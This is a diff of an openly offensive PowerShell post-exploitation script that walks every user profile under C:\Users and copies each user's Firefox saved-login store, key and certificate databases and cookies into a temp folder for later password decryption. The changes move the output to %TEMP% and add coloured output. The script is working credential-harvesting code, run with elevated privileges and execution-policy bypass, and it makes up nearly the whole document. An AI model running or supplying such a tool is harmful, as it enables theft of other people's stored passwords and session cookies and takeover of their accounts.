@@ -1,35 +1,26 @@
 <#
 .DESCRIPTION
-    Loops through all users in C:\Users and extracts sensitive Mozilla Firefox files. 
+    Loops through all users in C:\Users and dumps sensitive Mozilla Firefox files. 
     These files can later be used to decrypt stored passwords using `https://github.com/unode/firefox_decrypt` or other similar scripts.
     Needless to say the script needs to be ran as a *high privileged user* to get as much information as possible.
 
 .EXAMPLE
-    PS C:\tmp> powershell.exe -executionpolicy bypass .\firefox_extract.ps1
-
-	[+] Extracting secrets from 'Legit-User' to: C:\tmp\Legit-User\this-is-a-test-folder
-	[+] Extracting secrets from 'Legit-User' to: C:\tmp\Legit-User\this-is-another-folder
-	[-] 'Fredde' doesn't have any saved passwords in Mozilla Firefox
-	[-] 'Public' doesn't have any saved passwords in Mozilla Firefox
+    PS E:\devop-scripts> powershell.exe -ExecutionPolicy Bypass .\firefox_dump.ps1
+    [-] 'Public' doesn't have any saved passwords in Mozilla Firefox
+    [+] Dumping secrets from 'user' to: C:\Users\void\AppData\Local\Temp\user\firefox\ahf32hh2.default-release
+    [+] Dumping secrets from 'user2' to: C:\Users\void\AppData\Local\Temp\user2\firefox\plhh3lmm.default-release
+    [-] 'user3' doesn't have any saved passwords in Mozilla Firefox
+    [+] Dumping secrets from 'void' to: C:\Users\void\AppData\Local\Temp\void\firefox\plmxz1zm.default-release
 
 .NOTES
     Author: 0xPThree @ Exploit.se
-    Date: 2024-05-09
-    Version: 1.0
+    Date: 2024-06-13
+    Version: 1.1
 #>
-
-$banner = @"
- ___    __   ___  ___  __       __              __  
-|__  | |__) |__  |__  /  \ \_/ |  \ |  |  |\/| |__) 
-|    | |  \ |___ |    \__/ / \ |__/ \__/  |  | |    
-                                      by: 0xPThree                
-
-"@
-Write-Host $banner
 
 try {
     $rootDirectory = "C:\Users"
-    $destinationDirectory = "C:\tmp"
+    $destinationDirectory = "$ENV:Temp"
     $filesToCopy = @("logins.json", "cert*.db", "key*.db", "cookies.sqlite")
     $found = $false
 
@@ -39,7 +30,7 @@ try {
         
         foreach ($loginsPath in $loginsPaths) {
             $found = $true
-            $destinationPath = Join-Path -Path $destinationDirectory -ChildPath $username
+            $destinationPath = Join-Path -Path $destinationDirectory -ChildPath "$username\firefox"
             $relativeProfilePath = $loginsPath.Directory.FullName.Substring($loginsPath.Directory.Parent.FullName.Length + 1)
             $destinationProfilePath = Join-Path -Path $destinationPath -ChildPath $relativeProfilePath
             
@@ -75,11 +66,11 @@ Path=$($loginsPath.Directory.Name)
 "@
             
             Set-Content -Path $profilesIniPath -Value $profilesIniContent -Force | Out-Null
-            Write-Host "[+] Extracting secrets from '$username' to: $destinationProfilePath"
+            Write-Host -NoNewline "[+] " -ForegroundColor DarkGreen;  Write-Host -NoNewline "Dumping secrets from '$username' to: $destinationProfilePath"; Write-Host ""
         }
         
-        if (-not $loginsPaths) { Write-Host "[-] '$username' doesn't have any saved passwords in Mozilla Firefox" }
+        if (-not $loginsPaths) { Write-Host -NoNewline "[-] " -ForegroundColor DarkYellow;  Write-Host -NoNewline "'$username' doesn't have any saved passwords in Mozilla Firefox"; Write-Host "" }
     }
 
-    if (-not $found) { Write-Host "[!] No passwords saved in Firefox for any user under $rootDirectory" }
-} catch { Write-Host "An error occurred: $_" }
+    if (-not $found) { Write-Host -NoNewline "[!] " -ForegroundColor DarkRed;  Write-Host -NoNewline "No passwords saved in Firefox for any user under $rootDirectory"; Write-Host "" }
+} catch { Write-Host "An error occurred: $_" -ForegroundColor DarkRed }
